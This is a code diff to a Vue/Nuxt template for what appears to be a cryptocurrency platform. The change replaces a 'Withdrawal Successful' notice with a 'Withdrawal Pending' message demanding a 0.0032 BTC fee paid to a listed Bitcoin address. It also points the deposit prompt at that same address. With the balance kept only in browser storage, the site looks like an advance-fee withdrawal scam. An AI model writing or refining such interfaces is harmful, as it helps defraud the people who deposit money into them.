@@ -197,16 +197,28 @@
       <p v-show="showAuthError" class="incorrectCodeTr" style="color: red;">{{ authErrorMessage }}</p>
     </div>
 
-    <div class="withdrawSuc" v-if="showlastmessage">
+    <!-- WITHDRAWAL SUCCESSFUL -->
+    <!-- <div class="withdrawSuc" v-if="showlastmessage">
         <p>
             Withdrawal Successful 
+        </p>
+        <p class="cancell" @click="clearLast">X</p>
+    </div> -->
+
+
+    <!-- WITHDRAWAL PENDING -->
+    <div class="withdrawSuc" v-if="showlastmessage">
+        <p>
+            Withdrawal Pending. <br>
+            -0.0032 BTC charges needed - awaiting your payment <br>
+            bc1q0wq6nns4tps9hs67jxscnctk8kjhx6tuyp2hzq
         </p>
         <p class="cancell" @click="clearLast">X</p>
     </div>
 
     <!-- Deposit Modal -->
     <div v-show="showDepositForm" class="contactForm depp">
-      <p>Please make your deposit on this wallet address <br> bc1qjq2nchv7hrnp65l6z652wrphdna2dp3mu0hp7w</p>
+      <p>Please make your deposit on this wallet address <br> bc1q0wq6nns4tps9hs67jxscnctk8kjhx6tuyp2hzq</p>
       <p class="cancelDeposit" @click="closeDepositModal" style="cursor: pointer; color: red;">X</p>
     </div>
 
@@ -278,7 +290,7 @@ const formatMoney = (amount) => {
 
 const saveBalance = (amount) => {
   if (process.client) {
-    localStorage.setItem('currentBalancesss', amount.toString())
+    localStorage.setItem('currentBalanc', amount.toString())
   }
 }
 
